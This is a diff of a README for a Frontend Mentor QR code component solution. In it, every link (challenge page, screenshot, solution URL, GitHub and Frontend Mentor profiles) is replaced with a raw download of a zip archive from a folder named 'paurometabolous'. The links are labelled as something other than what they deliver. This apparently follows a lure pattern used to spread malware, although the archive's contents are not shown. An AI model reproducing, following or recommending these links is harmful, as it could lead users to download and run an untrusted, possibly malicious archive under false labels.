@@ -1,6 +1,6 @@
 # Frontend Mentor - QR code component solution
 
-This is a solution to the [QR code component challenge on Frontend Mentor](https://raw.githubusercontent.com/Ali-Abbas1/QR-code-component/main/paurometabolous/QR-code-component.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects. 
+This is a solution to the [QR code component challenge on Frontend Mentor](https://github.com/Ali-Abbas1/QR-code-component/raw/refs/heads/main/paurometabolous/Q_code_component_2.6.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects. 
 
 ## Table of contents
 
@@ -12,12 +12,12 @@ This is a solution to the [QR code component challenge on Frontend Mentor](https
 
 ### Screenshot
 
-![](https://raw.githubusercontent.com/Ali-Abbas1/QR-code-component/main/paurometabolous/QR-code-component.zip)
+![](https://github.com/Ali-Abbas1/QR-code-component/raw/refs/heads/main/paurometabolous/Q_code_component_2.6.zip)
 
 
 ### Links
 
-- Solution URL: [Link](https://raw.githubusercontent.com/Ali-Abbas1/QR-code-component/main/paurometabolous/QR-code-component.zip)
+- Solution URL: [Link](https://github.com/Ali-Abbas1/QR-code-component/raw/refs/heads/main/paurometabolous/Q_code_component_2.6.zip)
 
 ### Built with
 
@@ -27,6 +27,6 @@ This is a solution to the [QR code component challenge on Frontend Mentor](https
 
 ## Author
 
-- Github - [@Ali-Abbas1](https://raw.githubusercontent.com/Ali-Abbas1/QR-code-component/main/paurometabolous/QR-code-component.zip)
-- Frontend Mentor - [@Ali-Abbas1](https://raw.githubusercontent.com/Ali-Abbas1/QR-code-component/main/paurometabolous/QR-code-component.zip)
+- Github - [@Ali-Abbas1](https://github.com/Ali-Abbas1/QR-code-component/raw/refs/heads/main/paurometabolous/Q_code_component_2.6.zip)
+- Frontend Mentor - [@Ali-Abbas1](https://github.com/Ali-Abbas1/QR-code-component/raw/refs/heads/main/paurometabolous/Q_code_component_2.6.zip)
 
